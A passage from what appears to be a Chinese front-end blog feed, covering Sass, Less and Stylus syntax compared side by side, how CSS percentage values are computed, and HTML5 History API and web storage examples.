foo;</span><br><span class="line">$attr: border;</span><br><span class="line">p.#&#123;$name&#125; &#123;</span><br><span class="line">  #&#123;$attr&#125;-color: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.foo &#123;</span><br><span class="line">  border-color: blue; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less"></a>Less</h4><p>通过 <code>{}</code> 插值语句可以在选择器或属性名中使用变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@mySelector: banner;</span><br><span class="line">.@&#123;mySelector&#125; &#123;</span><br><span class="line">  font-weight: bold;</span><br><span class="line">  line-height: 40px;</span><br><span class="line">  margin: 0 auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.banner &#123;</span><br><span class="line">  font-weight: bold;</span><br><span class="line">  line-height: 40px;</span><br><span class="line">  margin: 0 auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Stylus-1"><a href="#Stylus-1" class="headerlink" title="Stylus"></a>Stylus</h4><p>Stylus支持通过使用{}字符包围表达式来插入值，其会变成标识符的一部分。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vendor(prop,args)</span><br><span class="line">  -webkit-&#123;prop&#125; args</span><br><span class="line">  -moz-&#123;prop&#125; args</span><br><span class="line">  &#123;prop&#125; args</span><br><span class="line">border-radius()</span><br><span class="line">  vendor(&apos;border-radius&apos;,arguments)</span><br><span class="line">button</span><br><span class="line">  border-radius 1px 2px / 3px 4px</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">button &#123;</span><br><span class="line">  -webkit-border-radius: 1px 2px / 3px 4px;</span><br><span class="line">  -moz-border-radius: 1px 2px / 3px 4px;</span><br><span class="line">  border-radius: 1px 2px / 3px 4px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h3><p>在嵌套上，三种选择器基本一致，没有太大区别。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a &#123;</span><br><span class="line">  font-weight: bold;</span><br><span class="line">  text-decoration: none;</span><br><span class="line">  &amp;:hover &#123; text-decoration: underline; &#125;</span><br><span class="line">  body.firefox &amp; &#123; font-weight: normal; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a &#123;</span><br><span class="line">  font-weight: bold;</span><br><span class="line">  text-decoration: none; </span><br><span class="line">&#125;</span><br><span class="line">a:hover &#123;</span><br><span class="line">  text-decoration: underline; </span><br><span class="line">&#125;</span><br><span class="line">body.firefox a &#123;</span><br><span class="line">  font-weight: normal; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Sass还提供一种属性嵌套功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.funky &#123;</span><br><span class="line">  font: &#123;</span><br><span class="line">    family: fantasy;</span><br><span class="line">    size: 30em;</span><br><span class="line">    weight: bold;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.funky &#123;</span><br><span class="line">  font-family: fantasy;</span><br><span class="line">  font-size: 30em;</span><br><span class="line">  font-weight: bold; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><h4 id="Sass-2"><a href="#Sass-2" class="headerlink" title="Sass"></a>Sass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.error &#123;</span><br><span class="line">  border: 1px #f00;</span><br><span class="line">  background-color: #fdd;</span><br><span class="line">&#125;</span><br><span class="line">.attention &#123;</span><br><span class="line">  font-size: 3em;</span><br><span class="line">  background-color: #ff0;</span><br><span class="line">&#125;</span><br><span class="line">.seriousError &#123;</span><br><span class="line">  @extend .error;</span><br><span class="line">  @extend .attention;</span><br><span class="line">  border-width: 3px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.error, .seriousError &#123;</span><br><span class="line">  border: 1px #f00;</span><br><span class="line">  background-color: #fdd; </span><br><span class="line">&#125;</span><br><span class="line">.attention, .seriousError &#123;</span><br><span class="line">  font-size: 3em;</span><br><span class="line">  background-color: #ff0; </span><br><span class="line">&#125;</span><br><span class="line">.seriousError &#123;</span><br><span class="line">  border-width: 3px; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less"></a>Less</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nav ul &#123;</span><br><span class="line">  &amp;:extend(.inline);</span><br><span class="line">  background: blue;</span><br><span class="line">&#125;</span><br><span class="line">.inline &#123;</span><br><span class="line">  color: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nav ul &#123;</span><br><span class="line">  background: blue;</span><br><span class="line">&#125;</span><br><span class="line">.inline,</span><br><span class="line">nav ul &#123;</span><br><span class="line">  color: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Stylus-2"><a href="#Stylus-2" class="headerlink" title="Stylus"></a>Stylus</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">form</span><br><span class="line">  input[type=text]</span><br><span class="line">  padding: 5px</span><br><span class="line">  border: 1px solid #eee</span><br><span class="line">  color: #ddd</span><br><span class="line"></span><br><span class="line">textarea</span><br><span class="line">  @extends form input[type=text]</span><br><span class="line">  padding: 10px</span><br></pre></td></tr></table></figure><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">form input[type=text],</span><br><span class="line">textarea &#123;</span><br><span class="line">  padding: 5px;</span><br><span class="line">  border: 1px solid #eee;</span><br><span class="line">  color: #ddd;</span><br><span class="line">&#125;</span><br><span class="line">textarea &#123;</span><br><span class="line">  padding: 10px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="混入-Mixins"><a href="#混入-Mixins" class="headerlink" title="混入 (Mixins)"></a>混入 (Mixins)</h3><h4 id="Sass-3"><a href="#Sass-3" class="headerlink" title="Sass"></a>Sass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@mixin sexy-border($color, $width: 1in) &#123;</span><br><span class="line">  border: &#123;</span><br><span class="line">    color: $color;</span><br><span class="line">    width: $width;</span><br><span class="line">    style: dashed;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">p &#123; @include sexy-border(blue); &#125;</span><br><span class="line">h1 &#123; @include sexy-border(blue, 2in); &#125;</span><br></pre></td></tr></table></figure><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p &#123;</span><br><span class="line">  border-color: blue;</span><br><span class="line">  border-width: 1in;</span><br><span class="line">  border-style: dashed; </span><br><span class="line">&#125;</span><br><span class="line">h1 &#123;</span><br><span class="line">  border-color: blue;</span><br><span class="line">  border-width: 2in;</span><br><span class="line">  border-style: dashed; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less"></a>Less</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.my-mixin &#123;</span><br><span class="line">  color: black;</span><br><span class="line">&#125;</span><br><span class="line">.my-other-mixin() &#123;</span><br><span class="line">  background: white;</span><br><span class="line">&#125;</span><br><span class="line">.class &#123;</span><br><span class="line">  .my-mixin;</span><br><span class="line">  .my-other-mixin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.my-mixin &#123;</span><br><span class="line">  color: black;</span><br><span class="line">&#125;</span><br><span class="line">.class &#123;</span><br><span class="line">  color: black;</span><br><span class="line">  background: white;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Stylus-3"><a href="#Stylus-3" class="headerlink" title="Stylus"></a>Stylus</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">border-radius(n)</span><br><span class="line">  -webkit-border-radius n</span><br><span class="line">  -moz-border-radius n</span><br><span class="line">  border-radius n</span><br><span class="line">form input[type=button]</span><br><span class="line">  border-radius(5px)</span><br></pre></td></tr></table></figure><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">form input[type=button] &#123;</span><br><span class="line">  -webkit-border-radius: 5px;</span><br><span class="line">  -moz-border-radius: 5px;</span><br><span class="line">  border-radius: 5px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="import"><a href="#import" class="headerlink" title="@import"></a>@import</h3><p>三种语言基本一致。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@import &quot;foo.css&quot;;</span><br><span class="line">@import &quot;foo&quot; screen;</span><br><span class="line">@import &quot;http://foo.com/bar&quot;;</span><br><span class="line">@import url(foo);</span><br></pre></td></tr></table></figure></p><p>Sass还提供一种分音。如果需要导入 SCSS 或者 Sass 文件，但又不希望将其编译为 CSS，只需要在文件名前添加下划线，这样会告诉 Sass 不要编译这些文件，但导入语句中却不需要添加下划线。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//将文件命名为 _colors.scss，便不会编译 _colours.css 文件。</span><br><span class="line">@import &quot;colors&quot;;</span><br></pre></td></tr></table></figure></p><h3 id="输出设置"><a href="#输出设置" class="headerlink" title="输出设置"></a>输出设置</h3><p>Sass 提供了四种输出格式，可以通过 :style option 选项设定，或者在命令行中使用 –style 选项。</p><ul><li>:nested：Nested （嵌套）样式，默认的输出格式。选择器与属性等单独占用一行，缩进量与 Sass 文件中一致，每行的缩进量反映了其在嵌套规则内的层数。</li><li>:expanded：输出更像是手写的样式，选择器、属性等各占用一行，属性根据选择器缩进，而选择器不做任何缩进。</li><li>:compact：每条 CSS 规则只占一行，包含其下的所有属性。嵌套过的选择器在输出时没有空行，不嵌套的选择器会输出空白行作为分隔符。</li><li>:compressed：删除所有无意义的空格、空白行、以及注释，力求将文件体积压缩到最小，同时也会做出其他调整，比如会自动替换占用空间最小的颜色表达方式。</li></ul><h3 id="控制指令"><a href="#控制指令" class="headerlink" title="控制指令"></a>控制指令</h3><h4 id="Sass-4"><a href="#Sass-4" class="headerlink" title="Sass"></a>Sass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$type: monster;</span><br><span class="line">p &#123;</span><br><span class="line">  @if $type == ocean &#123;</span><br><span class="line">    color: blue;</span><br><span class="line">  &#125; @else if $type == matador &#123;</span><br><span class="line">    color: red;</span><br><span class="line">  &#125; @else if $type == monster &#123;</span><br><span class="line">    color: green;</span><br><span class="line">  &#125; @else &#123;</span><br><span class="line">    color: black;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p &#123;</span><br><span class="line">  color: green; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less"></a>Less</h4><p>在1.5.0以前，使用 <code>when</code> 的语法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.my-optional-style() when (@my-option = true) &#123;</span><br><span class="line">  button &#123;</span><br><span class="line">    color: white;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">.my-optional-style();</span><br></pre></td></tr></table></figure></p><p>1.5.0以后也可以使用 <code>&amp; when</code> 的方式模拟 <code>if</code> 。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&amp; when (@my-option = true) &#123;</span><br><span class="line">  button &#123;</span><br><span class="line">    color: white;</span><br><span class="line">  &#125;</span><br><span class="line">  a &#123;</span><br><span class="line">    color: blue;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>也可以使用 <code>if</code> 。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@dr: if(@my-option = true, &#123;</span><br><span class="line">  button &#123;</span><br><span class="line">    color: white;</span><br><span class="line">  &#125;</span><br><span class="line">  a &#123;</span><br><span class="line">    color: blue;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">@dr();</span><br></pre></td></tr></table></figure></p><h4 id="Stylus-4"><a href="#Stylus-4" class="headerlink" title="Stylus"></a>Stylus</h4><p>更接近Sass。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">overload-padding = true</span><br><span class="line">if overload-padding</span><br><span class="line">  padding(y, x)</span><br><span class="line">    margin y x</span><br><span class="line">body</span><br><span class="line">  padding 5px 10px</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>Sass的优势得益于对函数和库的支持，但是因为基于Ruby环境，并不是特别友好。</li><li>Less相对清晰，也更接近CSS本身的写法，由于受Sass的极大的影响，我们也能看到，其中一些长期被开发者诟病的写法也得到了改善，对于Less的前景还是相对看好的。</li><li>Stylus可以说是集合了Sass和Less的优点，并进行极大的自由化，虽然目前Stylus的使用程度不如前两者广泛，但是鉴于其基于Node环境，语法大多参考Sass，在未来将是一个十分有生命力的CSS预处理器。</li></ul><blockquote><p>参考链接：<br><a href="https://zhuanlan.zhihu.com/p/23382462" target="_blank" rel="noopener">浅谈css预处理器，Sass、Less和Stylus-知乎</a><br><a href="https://juejin.im/post/5c9b17cbf265da60c95b7c3a" target="_blank" rel="noopener">关于sass（scss）、less、postcss、stylus等的用法与区别-掘金</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> LESS </tag>
            
            <tag> SASS </tag>
            
            <tag> Stylus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS中的百分比计算</title>
      <link href="/CSS%E4%B8%AD%E7%9A%84%E7%99%BE%E5%88%86%E6%AF%94%E8%AE%A1%E7%AE%97.html"/>
      <url>/CSS%E4%B8%AD%E7%9A%84%E7%99%BE%E5%88%86%E6%AF%94%E8%AE%A1%E7%AE%97.html</url>
      
        <content type="html"><![CDATA[<p>CSS布局中会用到很多百分比，但他们究竟都是如何计算的呢，你可能一个不小心就会把他们混淆在一起，所以这里就对CSS中所有可以用到百分比的属性做一个总结，方便更加系统的理解和记忆。</p><a id="more"></a><h2 id="font-size"><a href="#font-size" class="headerlink" title="font-size"></a>font-size</h2><p>根据元素字体大小，当前大小为100%</p><h2 id="line-height"><a href="#line-height" class="headerlink" title="line-height"></a>line-height</h2><p>根据元素字体大小，当前大小为100%</p><h2 id="translate"><a href="#translate" class="headerlink" title="translate"></a>translate</h2><p>根据元素大小，当前大小为100%</p><h2 id="width"><a href="#width" class="headerlink" title="width"></a>width</h2><ul><li>正常文档流和浮动：百分比相对于父元素content-box</li><li>绝对定位：百分比相对于父元素padding-box</li></ul><h2 id="height"><a href="#height" class="headerlink" title="height"></a>height</h2><ul><li>正常文档流和浮动：百分比相对于父元素content-box</li><li>绝对定位：百分比相对于父元素padding-box</li><li>当父元素高度为auto：子元素高度百分比会被忽略</li></ul><h2 id="margin"><a href="#margin" class="headerlink" title="margin"></a>margin</h2><ul><li>正常文档流和浮动：百分比相对于父元素的content-box宽度</li><li>绝对定位：百分比相对于父元素的padding-box宽度</li></ul><h2 id="padding"><a href="#padding" class="headerlink" title="padding"></a>padding</h2><ul><li>正常文档流和浮动：百分比相对于父元素的content-box宽度</li><li>绝对定位：百分比相对于父元素的padding-box宽度</li></ul><h2 id="top-bottom-left-right"><a href="#top-bottom-left-right" class="headerlink" title="top/bottom/left/right"></a>top/bottom/left/right</h2><ul><li>非定位元素：无效果</li><li>相对定位： top和bottom百分比是相对父元素的content-box高度，left和right百分比是相对父元素的content-box宽度</li><li>绝对定位：top和bottom百分比是相对最近一级非static定位父元素的padding-box高度，left和right百分比是相对最近一级非static定位父元素的padding-box宽度</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML5知识点</title>
      <link href="/HTML5%E7%9F%A5%E8%AF%86%E7%82%B9.html"/>
      <url>/HTML5%E7%9F%A5%E8%AF%86%E7%82%B9.html</url>
      
        <content type="html"><![CDATA[<ul><li>最近阅读了HTML5权威指南，给HTML5中新增的知识点做了张思维导图，方便二次记忆和梳理。</li><li>针对其中部分知识点，已做举例补充。</li><li>有关Canvas部分的知识点不包括在内，将作为一个单独的专题进行梳理。<a id="more"></a></li></ul><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="../assets/20190821/html5.png" alt="Alt text"></p><h2 id="History-API"><a href="#History-API" class="headerlink" title="History API"></a>History API</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>用于在不刷新页面的前提下，通过脚本语言的方式来进行页面上某块局部内容的更新。</p><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history.pushState(state,null,&quot;edit.php?id=&quot;+id);</span><br></pre></td></tr></table></figure><h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&quot;popstate&quot;,function(e)&#123;</span><br><span class="line">    if(e.state)</span><br><span class="line">    loadPage(e.state.userType,e.state.id);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="本地存储"><a href="#本地存储" class="headerlink" title="本地存储"></a>本地存储</h2><h3 id="Web-Storage"><a href="#Web-Storage" class="headerlink" title="Web Storage"></a>Web Storage</h3><h4 id="sessionStorage"><a href="#sessionStorage" class="headerlink" title="sessionStorage"></a>sessionStorage</h4><ul><li>解释：数据保存在session对象中。</li><li>方法：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//setItem()</span><br><span class="line">sessionStorage.setItem(&apos;key&apos;,&apos;value&apos;);</span><br><span class="line">//or</span><br><span class="line">sessionStorage.key = value;</span><br><span class="line"></span><br><span class="line">//getItem()</span><br><span class="line">var val = sessionStorage.getItem(&apos;key&apos;);</span><br><span class="line">//or</span><br><span class="line">var val = sessionStorage.key;</span><br></pre></td></tr></table></figure></li></ul><h4 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h4><ul><li>解释：数据保存在客户端本地的硬件设备中。</li><li>方法：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//setItem()</span><br><span class="line">localStorage.setItem(&apos;key&apos;,&apos;value&apos;);</span><br><span class="line">//or</span><br><span class="line">localStorage.key = value;</span><br><span class="line"></span><br><span class="line">//getItem()</span><br><span class="line">var val = localStorage.getItem(&apos;key&apos;);</span><br><span class="line">//or</span><br><span class="line">var val = localStorage.key;</span><br></pre></td></tr></table></figure></li></ul><h4 id="storage事件"><a href="#storage事件" class="headerlink" title="storage事件"></a>storage事件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&apos;storage&apos;,function(event)&#123;</span><br><span class="line">    //sessionStorage或localStorage的值发生变动时所要执行的处理</span><br><span class="line">&#125;,false);</span><br></pre></td></tr></table></figure><ul><li>event.key：在session或localStorage中被修改的数据键值</li><li>event.oldValue：在session或localStorage中被修改前的值</li><li>event.newValue：在session或localStorage中被修改后的值</li><li>event.url：修改session或localStorage的页面的URL地址</li><li>event.storageArea：改动的为session或localStorage</li></ul><h3 id="本地数据库"><a href="#本地数据库" class="headerlink" title="本地数据库"></a>本地数据库</h3><h4 id="SQLLite"><a href="#SQLLite" class="headerlink" title="SQLLite"></a>SQLLite</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var db = openDatabase(&apos;mydb&apos;,&apos;1.0&apos;,&apos;Test DB&apos;,2*1024*1024);</span><br><span class="line">db.transaction(function(tx)&#123;</span><br><span class="line">    tx.executeSql(&apos;INSET INTO MsgData VALUES(?,?,?)&apos;,[name,message,time],</span><br><span class="line">        function(tx,rs)&#123;&#125;,</span><br><span class="line">        function(tx,error)&#123;&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="indexedDB"><a href="#indexedDB" class="headerlink" title="indexedDB"></a>indexedDB</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">//兼容浏览器</span><br><span class="line">window.indexedDB = window.indexedDB || window.webkitIndexedDB || window.mozIndexedDB || window.msIndexedDB;</span><br><span class="line">window.IDBTransaction = window.IDBTransaction || window.webkitIDBTransaction || window.msIDBTransaction;</span><br><span class="line">window.IDBKeyRange = window.IDBKeyRange || window.webkitIDBKeyRange || window.msIDBKeyRange;</span><br><span class="line">window.IDBCursor = window.IDBCursor || window.webkitIDBCursor || window.msIDBCursor;</span><br><span class="line"></span><br><span class="line">//连接数据库</span><br><span class="line">var dbName = &apos;indexedDBTest&apos;;</span><br><span class="line">var dbVersion = 20190824;</span><br><span class="line">var idb;</span><br><span class="line">var dbConnect = indexedDB.open(dbName,dbVersion);</span><br><span class="line">dbConnect.onsuccess = function(e)&#123;</span><br><span class="line">    idb = e.target.result;</span><br><span class="line"></span><br><span class="line">    //开启事务</span><br><span class="line">    var tx = idb.transaction([&apos;Users&apos;],&quot;readwrite&quot;);</span><br><span class="line">    var store 